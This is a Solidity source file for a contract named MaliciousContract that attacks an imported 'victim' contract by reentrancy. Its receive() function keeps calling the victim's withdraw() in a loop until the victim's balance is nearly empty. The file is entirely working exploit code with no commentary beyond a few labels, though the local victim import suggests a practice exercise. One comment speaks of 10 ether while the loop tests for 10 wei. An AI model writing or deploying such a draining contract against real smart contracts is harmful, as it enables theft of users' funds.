pragma solidity ^0.8.13;

import {victim} from "./victim.sol";

contract MaliciousContract{
    victim public targetContract;
    uint256 public attackAmount;
    bool public attackInitiated;
    mapping(address => uint256) public balances;
    event a(address indexed user, uint256 amount);

constructor(victim _targetContract, uint256 _attackAmount){
    targetContract = _targetContract;
    attackAmount = _attackAmount;
}

function getETH() external payable{
    balances[msg.sender] += msg.value;
    emit a(msg.sender, msg.value);
}

function depositETH() external payable{
    targetContract.deposit{value: attackAmount}();
}

//Function to start the reentrancy attack

function initiateReentrancyAttack() external payable {

    attackInitiated = true;
    targetContract.withdraw();
}

// 10 ether = 10000000000000000000 wei

// Function to receive Ether

    receive() external payable{
        if (attackInitiated){
            while(address(targetContract).balance >= 10){
                targetContract.withdraw();
            }
        }
    }

}